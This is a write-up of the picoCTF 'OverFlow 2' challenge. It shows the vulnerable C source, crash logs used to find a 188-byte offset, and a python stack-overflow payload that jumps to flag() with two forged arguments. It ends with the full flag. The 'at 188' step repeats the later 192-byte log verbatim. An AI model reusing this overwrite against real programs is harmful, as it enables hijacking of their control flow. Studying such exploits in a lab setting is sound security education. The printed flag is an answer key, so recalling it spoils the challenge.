# OverFlow 2
## Question
>Now try overwriting arguments. Can you get the flag from this [program](files/vuln)? You can find it in `/problems/overflow-2_4_bbfcc061b1e9e5e8a7e313593365d434` on the shell server. [Source](files/vuln.c).

## Hint
>GDB can print the stack after you send arguments

# Solution
## Source code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

```

## Offset
Let's find out the offset for our buffer overflow. We'll start at `176` (buffer size) and will increase by 4 bytes until we see `41414141` erasing the stack address:

At 188, we're almost there:
~~~~
$ python -c "print 'A'*192" | ./vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
unknown@ubuntu:/data$ dmesg | tail
[ 1560.990116] traps: vuln[2567] trap invalid opcode ip:8048700 sp:ffd50e80 error:0 in vuln[8048000+1000]
[ 1588.337345] vuln[2572]: segfault at 42424242 ip 0000000042424242 sp 00000000ff925a30 error 14 in libc-2.27.so[f7db1000+1d5000]
[ 1588.337353] Code: Bad RIP value.
[ 1959.109560] vuln[2708]: segfault at 42424242 ip 0000000042424242 sp 00000000ffdf3cb4 error 14 in libc-2.27.so[f7dd8000+1d5000]
[ 1959.109568] Code: Bad RIP value.
[ 3629.832816] vuln[2806]: segfault at 4141413d ip 000000000804872a sp 000000004141413d error 4 in vuln[8048000+1000]
[ 3629.832837] Code: ff ff 83 c4 10 83 ec 0c 8d 83 31 e8 ff ff 50 e8 4c fd ff ff 83 c4 10 e8 5a ff ff ff b8 00 00 00 00 8d 65 f8 59 5b 5d 8d 61 fc <c3> 66 90 66 90 90 55 57 56 53 e8 e7 fd ff ff 81 c3 c7 18 00 00 83
[ 3648.733934] traps: vuln[2811] trap invalid opcode ip:8048700 sp:ffdd6240 error:0 in vuln[8048000+1000]
[ 3659.629659] vuln[2816]: segfault at 41414141 ip 0000000041414141 sp 00000000ff84c5c0 error 14 in libc-2.27.so[f7dcd000+1d5000]
[ 3659.629668] Code: Bad RIP value.
~~~~

We have `41414141` with 192 bytes:
~~~~
$ python -c "print 'A'*192" | ./vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
unknown@ubuntu:/data$ dmesg | tail
[ 1560.990116] traps: vuln[2567] trap invalid opcode ip:8048700 sp:ffd50e80 error:0 in vuln[8048000+1000]
[ 1588.337345] vuln[2572]: segfault at 42424242 ip 0000000042424242 sp 00000000ff925a30 error 14 in libc-2.27.so[f7db1000+1d5000]
[ 1588.337353] Code: Bad RIP value.
[ 1959.109560] vuln[2708]: segfault at 42424242 ip 0000000042424242 sp 00000000ffdf3cb4 error 14 in libc-2.27.so[f7dd8000+1d5000]
[ 1959.109568] Code: Bad RIP value.
[ 3629.832816] vuln[2806]: segfault at 4141413d ip 000000000804872a sp 000000004141413d error 4 in vuln[8048000+1000]
[ 3629.832837] Code: ff ff 83 c4 10 83 ec 0c 8d 83 31 e8 ff ff 50 e8 4c fd ff ff 83 c4 10 e8 5a ff ff ff b8 00 00 00 00 8d 65 f8 59 5b 5d 8d 61 fc <c3> 66 90 66 90 90 55 57 56 53 e8 e7 fd ff ff 81 c3 c7 18 00 00 83
[ 3648.733934] traps: vuln[2811] trap invalid opcode ip:8048700 sp:ffdd6240 error:0 in vuln[8048000+1000]
[ 3659.629659] vuln[2816]: segfault at 41414141 ip 0000000041414141 sp 00000000ff84c5c0 error 14 in libc-2.27.so[f7dcd000+1d5000]
[ 3659.629668] Code: Bad RIP value.
~~~~

Our offset will be 188.

## Addresses and variables
Let's first identify the address of the `flag` function, and encode it:
~~~~
$ readelf -s vuln | grep flag
    73: 080485e6   144 FUNC    GLOBAL DEFAULT   14 flag
$ python -c "import pwn;print(pwn.p32(0x80485e6))"
b'\xe6\x85\x04\x08'
~~~~

Now, let's encode the 2 variables:
~~~~
$ python
>>> import pwn
>>> pwn.p32(0xDEADBEEF)
b'\xef\xbe\xad\xde'
>>> pwn.p32(0xC0DED00D)
b'\r\xd0\xde\xc0'
~~~~

To exploit the vulnerability, we'll create the following chain:
* 'B' * 188 to overflow the string buffer
* '\xe6\x85\x04\x08' is the address of the `flag` function where we want to jump
* 'B'*4: we need to add 4 bytes for the return address of the `flag` function (stack = EBP > return address > 1st arg > 2nd arg)
* '\xef\xbe\xad\xde': our first argument
* '\r\xd0\xde\xc0': our second argument

## Exploit
~~~~
$ python -c "print 'B'*188 + '\xe6\x85\x04\x08' + 'B'*4 + '\xef\xbe\xad\xde' + '\r\xd0\xde\xc0'" | ./vuln
Please enter your string: 
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB���BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBﾭ�
picoCTF{arg5_and_r3turn598632d70}Segmentation fault (core dumped)
~~~~

# Flag
`picoCTF{arg5_and_r3turn598632d70}`
